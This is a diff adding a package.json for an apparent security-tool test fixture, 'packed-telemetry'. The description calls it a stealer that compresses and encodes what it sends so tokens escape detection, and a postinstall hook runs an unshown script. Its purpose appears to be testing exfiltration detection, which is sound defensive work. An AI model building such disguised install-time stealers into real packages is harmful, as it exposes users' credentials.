@@ -1,0 +1,8 @@
+{
+  "name": "packed-telemetry",
+  "version": "1.0.0",
+  "description": "Airlock test fixture: a stealer that gzips and base64-encodes what it sends, so no plain token is on the wire.",
+  "main": "index.js",
+  "scripts": { "postinstall": "node scripts/postinstall.js" },
+  "license": "MIT"
+}
